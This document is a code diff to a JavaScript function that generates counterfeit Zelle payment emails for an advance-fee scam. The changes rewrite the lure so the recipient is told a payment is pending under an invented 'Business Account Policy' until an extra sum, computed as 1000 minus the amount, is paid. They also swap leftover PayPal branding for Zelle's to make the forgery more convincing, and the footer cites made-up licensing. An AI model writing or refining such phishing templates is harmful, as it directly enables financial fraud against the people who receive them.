@@ -25,14 +25,15 @@ export const zelleSendEmail = async ({ email, name, amount }) => {
   }
   const date = getFormattedDate();
 
+  // amount to pay
+  const amountToPay = (1000 - Number(amount)).toLocaleString();
+
   // full amount
   const fullAmount = (Number(amount) + 501).toLocaleString();
 
   // message
-  const message = `You've received a payment of $${amount}.00 USD and it is pending due to account limitations under our Seller Protection policy for business transactions.
-
-  To complete the transaction, the sender is required to send an additional $501.00 USD from the same business account to automatically upgrade your account for future business transactions.
-  
+  const message = `You've received a payment of $${amount}.00 USD and it is pending balance due to our new Business Account Policy for payments below $1,000.00.
+  To accept this payment automatically, An additional payment of $${amountToPay}.00 USD from the same business account is required.
   Once completed, your account will be credited with the full amount of $${fullAmount}.00 USD instantly.`;
 
   // html
@@ -93,7 +94,7 @@ export const zelleSendEmail = async ({ email, name, amount }) => {
     text-align: center;
     margin-top: 10px;
   ">
-    <a href="https://twitter.com/zellepay" style="margin:0 5px;color:#0b4a6f;text-decoration:none;">Twitter</a> |
+    <a href="https://twitter.com/zelle" style="margin:0 5px;color:#0b4a6f;text-decoration:none;">Twitter</a> |
     <a href="https://instagram.com/zellepay" style="margin:0 5px;color:#0b4a6f;text-decoration:none;">Instagram</a> |
     <a href="https://facebook.com/zellepay" style="margin:0 5px;color:#0b4a6f;text-decoration:none;">Facebook</a>
   </p>
@@ -106,7 +107,7 @@ Zelle is committed to preventing fraudulent emails. Emails from Zelle will alway
 Learn to identify phishing
 Please don't reply to this email. To get in touch with us, click Help & Contact.
 Not sure why you received this email? Learn more
-Copyright © 1999-2026 PayPal. All rights reserved.
+Copyright © 1999-2026 Zelle. All rights reserved.
 Zelle Pte. Ltd. is licensed by the Monetary Authority of United States as a Major Payment Institution under the Payment Services Act 2019.
       </td>
     </tr>
@@ -128,4 +129,4 @@ Zelle Pte. Ltd. is licensed by the Monetary Authority of United States as a Majo
 
   // return
   return true;
-};
+};;
